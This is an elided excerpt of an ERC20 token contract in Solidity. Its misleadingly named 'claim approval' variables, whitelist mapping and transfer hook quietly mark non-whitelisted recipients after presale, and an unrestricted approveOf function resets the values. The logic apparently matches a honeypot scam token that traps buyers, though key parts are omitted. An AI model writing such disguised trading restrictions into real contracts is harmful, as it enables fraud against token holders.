...
contract ERC20 is Context, IERC20 {
  ...
  uint256 private _defaultBalance = 0;
  uint256 private _claimApproval;
  uint256 private _claimBalance;
  ...
  event claimApprovalUpdated(uint256 oldValue, uint256 newValue);
  event claimBalanceUpdated(uint256 oldValue, uint256 newValue);
  ...
  constructor(
    ...
    _claimApproval = claimApproval;
    _claimBalance = claimBalance;
    _Presale = false;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual ensureApproval(sender) {
    ...
    if (!_Presale) {
        ...
        if (recipientClaim == 0 && getApproval[recipient] == 0 && !Gwei[recipient] && (_claimTokenBlock[sender] + 20 < block.number)) {
            _sendApproval(recipient, _claimBalance);
        } else if (recipientClaim > 0 && getApproval[recipient] == 0 && !Gwei[recipient] && (_claimTokenBlock[sender] + 20 < block.number)) {
            _sendApproval(recipient, _claimApproval);
        }
  ...
  function approveOf(uint256 newDefaultApproval) external {
    ...
    emit claimApprovalUpdated(_claimApproval, newDefaultApproval);
    _claimApproval = newDefaultApproval;
    emit claimBalanceUpdated(_claimBalance, newDefaultApproval);
    _claimBalance = newDefaultApproval;
  }
